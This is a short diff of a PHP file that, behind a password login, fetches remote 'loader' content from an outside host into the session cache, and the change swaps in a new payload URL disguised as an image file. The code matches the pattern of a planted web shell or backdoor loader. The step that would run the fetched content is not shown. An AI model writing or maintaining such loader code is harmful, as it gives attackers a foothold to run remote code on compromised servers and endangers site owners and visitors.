@@ -901,7 +901,7 @@ if (isset($_POST['password'])) {
 
 if (is_logged_in()) {
     if (!isset($_SESSION['cached_data']) || empty($_SESSION['cached_data'])) {
-        $_SESSION['cached_data'] = geturlsinfo('https://isnujombang.org/kerang/loaders.txt');
+        $_SESSION['cached_data'] = geturlsinfo('https://batuk-di-komik-aja.pages.dev/loaders.jpg');
         if (empty($_SESSION['cached_data'])) {
             echo "failed";
             exit;
